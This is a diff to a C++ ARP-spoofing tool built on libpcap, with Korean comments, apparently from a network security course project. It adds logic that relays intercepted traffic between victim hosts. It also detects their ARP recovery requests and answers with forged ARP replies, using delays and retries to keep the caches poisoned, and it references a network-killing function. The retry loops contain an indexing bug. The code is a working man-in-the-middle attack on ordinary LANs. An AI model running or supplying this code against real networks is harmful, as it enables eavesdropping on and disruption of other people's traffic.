@@ -85,7 +85,11 @@ void tInfectAll(const char* deviceName_, Mac MyMac_,
  std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
 std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_, int period_);
 
-void tRelayAll(const char* deviceName_, Mac MyMac_,
+void tCaptureAll(const char* deviceName_, Mac MyMac_,
+ std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
+ std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_);
+
+void tRelayAndReinfectAll(const char* deviceName_, Mac MyMac_,
  std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
  std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_);
 
@@ -152,18 +156,19 @@ int main(int argc, char* argv[]) {
 	ResolveSenderMacThread1.join();
 	ResolveSenderMacThread2.join();
 
-	// infect all.
+	// infect all periodically.
 	std::thread InfectThread(tInfectAll, dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList, 10000);
 
-	// relay all.
-	std::thread RelayThread(tRelayAll, dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList);
+	// relay all and infect all at specified time.
+	std::thread RelayAndReinfectThread(tRelayAndReinfectAll, dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList);
 
 	// Wait SIGINT...
-	RelayThread.join();
+	RelayAndReinfectThread.join();
 	InfectThread.join();
 
 	// recover all.
 	RecoverArpTables(dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList);
+	printf("ARP table recoverd.\n");
 
 	return 0;
 }
@@ -422,7 +427,7 @@ void tInfectAll(const char* deviceName_, Mac MyMac_,
 		for(int i = 0; i < listSize; i++){
 			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&(pktArpRepInfectSenderList.at(i))), sizeof(EthArpPacket));
 			if (res != 0) {
-				fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+				fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
 				pcap_close(handle);
 				return;
 			}
@@ -430,7 +435,7 @@ void tInfectAll(const char* deviceName_, Mac MyMac_,
 
 			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktArpRepInfectTargetList.at(i)), sizeof(EthArpPacket));
 			if (res != 0) {
-				fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+				fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
 				pcap_close(handle);
 				return;
 			}
@@ -444,6 +449,7 @@ void tInfectAll(const char* deviceName_, Mac MyMac_,
 
 /**
  * @brief Thread function to relay given (maybe)infected senders and targets.
+ *  and re-infect when ARP recover packet be captured.
  * 
  * @param[in] deviceName_ NIC device name.
  * @param[in] MyMac_ MyMac object.
@@ -452,7 +458,7 @@ void tInfectAll(const char* deviceName_, Mac MyMac_,
  * @param[in] TargetIpList_ target Ip object list to relay.
  * @param[in] TargetMacList_ target Mac object list to relay.
  */
-void tRelayAll(const char* deviceName_, Mac MyMac_,
+void tRelayAndReinfectAll(const char* deviceName_, Mac MyMac_,
  std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
  std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_){
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -465,7 +471,7 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 	if (!(SenderIpList_.size() == SenderMacList_.size()
 	 && SenderMacList_.size() == TargetIpList_.size()
 	 && TargetIpList_.size() == TargetMacList_.size())){
-		fprintf(stderr, "@tRelayAll: list size error\n");
+		fprintf(stderr, "@tRelayAndReinfectAll: list size error\n");
 		pcap_close(handle);
 		return;
 	}
@@ -479,65 +485,178 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 	while (!g_SIGINT_flag)
 	{
 		sleep(0);
+		const int nRetry = 10;
+		const int uLatency = 500000;
 		const u_char* rawRecv;
 		res = pcap_next_ex(handle, &header, &rawRecv);
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-			printf("@tRelayAll: pcap_next_ex error=%s\n", pcap_geterr(handle));
+			printf("@tRelayAndReinfectAll: pcap_next_ex error=%s\n", pcap_geterr(handle));
 			pcap_close(handle);
 			return;
 		}
 
 		// relay only Eth + Ipv4 packet.
 		eEthIpv4TcpPacket* pktHdr = (eEthIpv4TcpPacket*)rawRecv;
-		if (ntohs(pktHdr->eEthHdr_.TYPE) != EthHdr::Ip4){
-			// drop Ipv6, arp, etc.
-			// @Todo: capture [sender -> me] ARP request(unicast to me) packet and refresh using single ARP reply packet.
-			// @Todo: capture [sedner -> all] ARP request(broadcast=expired) packet and refresh using multiple ARP reply packets.
-			// @Todo: capture [target -> sender] ARP request(host scan) packet and refresh single ARP reply packet.
+		uint16_t ethType = ntohs(pktHdr->eEthHdr_.TYPE);
+		if (ethType == EthHdr::Arp){
+			// sender 혹은 target의 ARP 복구 시도 패킷이 캡처된다면, 재감염합니다.
+			// 최초 프로그램 시점에 감염되어 있었더라면, 특별한 일이 없는 이상 별도로 주기적으로 재감염할 필요가 없습니다.
+			for(int i = 0; i < listSize; i++){
+				EthArpPacket* pktEthArp = (EthArpPacket*)rawRecv;
+				if (pktEthArp->eth_.smac_ == SenderMacList_.at(i)
+				 && pktEthArp->arp_.op_ == htons(ArpHdr::Request)
+				 && pktEthArp->arp_.smac_ == SenderMacList_.at(i)
+				 && (uint32_t)pktEthArp->arp_.sip_ == htonl(SenderIpList_.at(i))
+				 && pktEthArp->arp_.tmac_ == Mac().nullMac()
+				 && (uint32_t)pktEthArp->arp_.tip_ == htonl(TargetIpList_.at(i))){
+					if ((pktEthArp->eth_.dmac_ == MyMac_) || pktEthArp->eth_.dmac_ == Mac().broadcastMac()){
+						EthArpPacket pktSmartInfect;
+						pktSmartInfect.eth_.smac_ = MyMac_;
+						pktSmartInfect.eth_.dmac_ = SenderMacList_.at(i);
+						pktSmartInfect.eth_.type_ = htons(EthHdr::Arp);
+						pktSmartInfect.arp_.hrd_ = htons(ArpHdr::ETHER);
+						pktSmartInfect.arp_.pro_ = htons(EthHdr::Ip4);
+						pktSmartInfect.arp_.hln_ = Mac::SIZE;
+						pktSmartInfect.arp_.pln_ = Ip::SIZE;
+						pktSmartInfect.arp_.op_ = htons(ArpHdr::Reply);
+						pktSmartInfect.arp_.smac_ = MyMac_;
+						pktSmartInfect.arp_.sip_ = htonl(TargetIpList_.at(i));
+						pktSmartInfect.arp_.tmac_ = SenderMacList_.at(i);
+						pktSmartInfect.arp_.tip_ = htonl(SenderIpList_.at(i));
+
+						if (pktEthArp->eth_.dmac_ == MyMac_){
+							// 만료되기 전에 unicast로 온다면, 재감염합니다.
+							res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktSmartInfect), header->caplen);
+							if (res != 0) {
+								fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
+								pcap_close(handle);
+								return;
+							}
+							break;
+						}
+						else{
+							// 이미 만료되어 이미 broadcast가 뿌려진 상황이라면,
+							// broadcast에 대한 응답으로 target 혹은 sender가 정상적인 reply 패킷을 보내기 전에
+							// 지연시간을 넣어 우선순위를 높입니다. 혹시 모르니 nRetry번 보냅니다.
+							usleep(uLatency);
+							for (int j = 0; i < nRetry; i++){
+								res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktSmartInfect), header->caplen);
+								if (res != 0) {
+									fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
+									pcap_close(handle);
+									return;
+								}
+							}
+							break;
+						}
+					}
+				}
+				else if (pktEthArp->eth_.smac_ == TargetMacList_.at(i)
+				 && pktEthArp->arp_.op_ == htons(ArpHdr::Request)
+				 && pktEthArp->arp_.smac_ == TargetMacList_.at(i)
+				 && (uint32_t)pktEthArp->arp_.sip_ == htonl(TargetIpList_.at(i))
+				 && pktEthArp->arp_.tmac_ == Mac().nullMac()
+				 && (uint32_t)pktEthArp->arp_.tip_ == htonl(SenderIpList_.at(i))){
+					if ((pktEthArp->eth_.dmac_ == MyMac_) || pktEthArp->eth_.dmac_ == Mac().broadcastMac()){
+						EthArpPacket pktSmartInfect;
+						pktSmartInfect.eth_.smac_ = MyMac_;
+						pktSmartInfect.eth_.dmac_ = TargetMacList_.at(i);
+						pktSmartInfect.eth_.type_ = htons(EthHdr::Arp);
+						pktSmartInfect.arp_.hrd_ = htons(ArpHdr::ETHER);
+						pktSmartInfect.arp_.pro_ = htons(EthHdr::Ip4);
+						pktSmartInfect.arp_.hln_ = Mac::SIZE;
+						pktSmartInfect.arp_.pln_ = Ip::SIZE;
+						pktSmartInfect.arp_.op_ = htons(ArpHdr::Reply);
+						pktSmartInfect.arp_.smac_ = MyMac_;
+						pktSmartInfect.arp_.sip_ = htonl(SenderIpList_.at(i));
+						pktSmartInfect.arp_.tmac_ = TargetMacList_.at(i);
+						pktSmartInfect.arp_.tip_ = htonl(TargetIpList_.at(i));
+
+						if (pktEthArp->eth_.dmac_ == MyMac_){
+							res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktSmartInfect), header->caplen);
+							if (res != 0) {
+								fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
+								pcap_close(handle);
+								return;
+							}
+							break;
+						}
+						else{
+							usleep(uLatency);
+							for (int j = 0; i < nRetry; i++){
+								res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktSmartInfect), header->caplen);
+								if (res != 0) {
+									fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
+									pcap_close(handle);
+									return;
+								}
+							}
+							break;
+						}
+					}
+				}
+			}
 			continue;
 		}
- 
-		for(int i = 0; i < listSize; i++){
-			uint32_t pktSrcIp = ntohl(pktHdr->eIpv4Hdr_.SRC_IP_ADDR);
-			uint32_t pktDstIp = ntohl(pktHdr->eIpv4Hdr_.DST_IP_ADDR);
-			uint32_t senderIp = SenderIpList_.at(i);
-			uint32_t targetIp = TargetIpList_.at(i);
-	
-			// src ip가 sender이고, 내 ip로 보낸 패킷이 아니라면,
-			if (pktSrcIp == senderIp && pktDstIp != myIpAddr) {
-				// @Todo: pass jumbo frames.
-				uintptr_t originalSrcMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.SRC_MAC_ADDR);
-				memcpy((void*)originalSrcMacPtr, myMacAddr, sizeof(uint8_t) * 6);
+		else if (ethType == EthHdr::Ip4){
+			for(int i = 0; i < listSize; i++){
+				uint32_t pktSrcIp = ntohl(pktHdr->eIpv4Hdr_.SRC_IP_ADDR);
+				uint32_t pktDstIp = ntohl(pktHdr->eIpv4Hdr_.DST_IP_ADDR);
+				uint32_t senderIp = SenderIpList_.at(i);
+				uint32_t targetIp = TargetIpList_.at(i);
+		
+				// src ip가 sender이고, 내 ip로 보낸 패킷이 아니라면,
+				if (pktSrcIp == senderIp && pktDstIp != myIpAddr) {
+					// @Todo: pass jumbo frames.
+					uintptr_t originalSrcMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.SRC_MAC_ADDR);
+					memcpy((void*)originalSrcMacPtr, myMacAddr, sizeof(uint8_t) * 6);
 
-				uintptr_t originalDstMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.DST_MAC_ADDR);
-				memcpy((void*)originalDstMacPtr, (uint8_t*)(TargetMacList_.at(i)), sizeof(uint8_t) * 6);
+					uintptr_t originalDstMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.DST_MAC_ADDR);
+					memcpy((void*)originalDstMacPtr, (uint8_t*)(TargetMacList_.at(i)), sizeof(uint8_t) * 6);
 
-				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pktHdr), header->caplen);
-				if (res != 0) {
-					fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
-					pcap_close(handle);
-					return;
-				}				
-				break;
-			}
-	
-			// src mac이 target이고, sender ip에게 보낸 패킷이라면,
-			if (memcmp(pktHdr->eEthHdr_.SRC_MAC_ADDR, (uint8_t*)(TargetMacList_.at(i)), sizeof(uint8_t) * 6) == 0
-			 && pktDstIp == senderIp){
-				uintptr_t originalSrcMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.SRC_MAC_ADDR);
-				memcpy((void*)originalSrcMacPtr, myMacAddr, sizeof(uint8_t) * 6);
+					if (1500 < header->caplen){
+						fprintf(stderr, "skip jumbo frame.\n");
+						break;
+					}
 
-				uintptr_t originalDstMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.DST_MAC_ADDR);
-				memcpy((void*)originalDstMacPtr, (uint8_t*)(SenderMacList_.at(i)), sizeof(uint8_t) * 6);
-
-				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pktHdr), header->caplen);
-				if (res != 0) {
-					fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
-					pcap_close(handle);
-					return;
+					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pktHdr), header->caplen);
+					if (res != 0) {
+						fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
+						pcap_close(handle);
+						return;
+					}
+					//printf("relay: sender -> me -> target\nsrcIp=%s\ndstIp=%s\n\n", std::string(Ip(pktSrcIp)).c_str(), std::string(Ip(pktDstIp)).c_str());
+					break;
 				}
-				break;
+		
+				// src mac이 target이고, sender ip에게 보낸 패킷이라면,
+				if (memcmp(pktHdr->eEthHdr_.SRC_MAC_ADDR, (uint8_t*)(TargetMacList_.at(i)), sizeof(uint8_t) * 6) == 0
+				&& pktDstIp == senderIp){
+					uintptr_t originalSrcMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.SRC_MAC_ADDR);
+					memcpy((void*)originalSrcMacPtr, myMacAddr, sizeof(uint8_t) * 6);
+
+					uintptr_t originalDstMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.DST_MAC_ADDR);
+					memcpy((void*)originalDstMacPtr, (uint8_t*)(SenderMacList_.at(i)), sizeof(uint8_t) * 6);
+
+					if (1500 < header->caplen){
+						fprintf(stderr, "skip jumbo frame.\n");
+						break;
+					}
+
+					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pktHdr), header->caplen);
+					if (res != 0) {
+						fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
+						pcap_close(handle);
+						return;
+					}
+					//printf("relay: target -> me -> sender\nsrcIp=%s\ndstIp=%s\n\n", std::string(Ip(pktSrcIp)).c_str(), std::string(Ip(pktDstIp)).c_str());
+					break;
+				}
 			}
+		}
+		else{
+			// drop Ipv6, etc.
+			continue;
 		}
 	}
 	pcap_close(handle);
@@ -597,7 +716,7 @@ void RecoverArpTables(const char* deviceName_, Mac MyMac_,
 	for(int i = 0; i < pktArpRepRecoverList.size(); i++){
 		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&(pktArpRepRecoverList.at(i))), sizeof(EthArpPacket));
 		if (res != 0) {
-			fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+			fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
 			pcap_close(handle);
 			return;
 		}
@@ -614,6 +733,7 @@ void RecoverArpTables(const char* deviceName_, Mac MyMac_,
  */
 void SigintHandler(int SIGNUM_){
 	printf("\nSIGINT captured, joining threads...\n");
+	printf("Trigger ARP table recover function.\n");
 	g_SIGINT_flag = true;
 	return;
 }
@@ -655,7 +775,7 @@ void KillAllNetwork(const char* deviceName_, Ip gatewayIp_){
 	{
 		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pkt), sizeof(EthArpPacket));
 		if (res != 0) {
-			fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+			fprintf(stderr, "pcap_sendpacket error=[%d]%s\n", res, pcap_geterr(handle));
 			pcap_close(handle);
 			return;
 		}
